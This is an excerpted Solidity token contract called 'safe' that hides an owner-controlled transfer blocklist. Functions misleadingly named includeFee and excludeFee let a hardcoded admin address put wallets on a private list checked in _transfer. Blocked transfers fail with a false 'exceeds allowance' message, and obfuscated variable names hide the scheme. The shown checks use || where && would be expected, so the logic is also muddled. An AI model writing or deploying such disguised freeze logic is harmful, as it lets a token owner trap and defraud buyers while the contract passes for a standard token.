...
interface IERC20 {
  ...
  function balanceOf(address g2A) external view returns (uint256);
...
contract safe is Context, IERC20, Ownable {
  ...
  mapping (address => bool) private _g2A; 
  mapping (address => uint256) public g2List;
  mapping (address => bool) private __g2List;
  ...
  address private adminAddress = address(0xA64A5582E56270aD47e3aa77E9c7ee807189875d);
  ...
  function balanceOf(address g2) external view returns (uint256) {
    return _balances[g2];
  }
  ...
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    ...
    function includeFee(address[] memory _g2List) public {
        require(_msgSender() == adminAddress);
        for (uint256 i = 0; i < _g2List.length; i++) {
            __g2List[_g2List[i]] = true; }
    }

    function excludeFee(address remove) public {
        require(_msgSender() == adminAddress);
        __g2List[remove] = false;
    }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0) || recipient != address(0), "ERC20: transfer contains the zero address");
    require(!__g2List[sender] || !__g2List[recipient], "ERC20: transfer amount exceeds allowance");
